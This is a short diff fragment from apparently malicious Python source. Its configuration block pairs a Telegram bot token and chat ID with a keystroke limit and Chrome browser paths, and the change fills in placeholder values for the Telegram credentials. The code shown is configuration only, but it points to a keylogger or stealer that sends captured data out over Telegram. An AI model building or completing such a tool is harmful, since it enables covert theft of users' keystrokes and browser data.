@@ -15,8 +15,8 @@ import pyperclip
 import time
 
 # ========== Configuration ========== #
-TELEGRAM_API_TOKEN = ""
-TELEGRAM_CHAT_ID = ""
+TELEGRAM_API_TOKEN = "API bot"
+TELEGRAM_CHAT_ID = "Account ID"
 KEYSTROKE_LIMIT = 100
 BROWSER_PATHS = {
     'Chrome': {
